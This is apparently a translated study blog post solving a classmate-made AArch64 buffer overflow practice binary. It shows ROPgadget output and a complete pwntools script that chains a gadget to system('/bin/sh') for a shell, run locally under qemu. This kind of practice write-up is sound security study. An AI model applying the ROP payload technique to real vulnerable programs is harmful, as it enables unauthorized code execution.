---
title: "[AArch64] Buffer OverFlow (Practice)"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ While studying aarch64 technique, a college classmate created a problem. It is a Buffer OverFlow problem named [Exploitable]. The symbol is deleted.. (Oh, it's annoying... But static is not applied...) to main()"
date: "2024-05-01"
translation_key: "tistory-e16623b654cb"
tags: ["STUDY/PWNABLE_AArch64"]
category: "STUDY/PWNABLE_AArch64"
source_url: "https://whrdud727.tistory.com/entry/AArch64-Buffer-OverFlow-%EC%8B%A4%EC%8A%B5"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※****

While studying the aarch64 technique, a college classmate created a problem.

It is a Buffer OverFlow problem named \[Exploitable\].

![](/assets/images/tistory/tistory-e16623b654cb/001.png)

The symbol has been deleted... (Oh, it's annoying... But static isn't on...)

![](/assets/images/tistory/tistory-e16623b654cb/002.png)

It is a function that appears as main().

There are no visible vulnerabilities.

![](/assets/images/tistory/tistory-e16623b654cb/003.png)

This is a function that is called.

The structure is very simple. As in the example covered earlier, the bof vulnerability occurs in the called function, not main().

However, since there is no function that immediately obtains a shell or outputs a flag, a chain must be formed using gadgets.

```
ROPgadget --binary Exploitable

#0x0000000000400724 : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
```

![](/assets/images/tistory/tistory-e16623b654cb/004.png)

There is a gadget that looks delicious.

Assuming that system("/bin/sh"); is implemented, the first argument value must be passed to the x0 register.

If you look at the gadget, there is a process of storing the value on the stack in x0, and x29 and x30 are overwritten through the ldp command.

At this time, since x30 corresponds to ret, the command you want to implement can be implemented.

Coincidentally, a function has been created to perform the scenario.

![](/assets/images/tistory/tistory-e16623b654cb/005.png)

The problem is solved by getting the address of system() from the function and entering the /bin/sh string.

```
from pwn import *

#p = process(['qemu-aarch64-static','./Exploitable'])
p = process(['qemu-aarch64-static','-g','1234','./Exploitable'])
e = ELF('./Exploitable')

#ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
gadget = 0x0000000000400724
system = 0x0000000000400590
binsh = 0x420040

payload = b'a'*0x28
payload += p64(gadget)
payload += b'a'*0x10
payload += p64(system)*2
payload += p64(0x0)
payload += p64(binsh)

p.sendlineafter(b'...', payload)

p.interactive()
```

If you write in the above manner, you can obtain the shell.

[

Exploitable

0.06MB

](https://blog.kakaocdn.net/dna/bV6S14/btsG3tnmYfg/AAAAAAAAAAAAAAAAAAAAAI-s461KpxfspdkapSiGTS3atLDJ6NDOXd8oiTSqzxPr/Exploitable?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1790780399&allow_ip=&allow_referer=&signature=aLIIripn%2FRu39F%2BDa4zAWFcuGZc%3D&attach=1&knm=tfile.dat)

I am uploading the file after receiving permission to share it.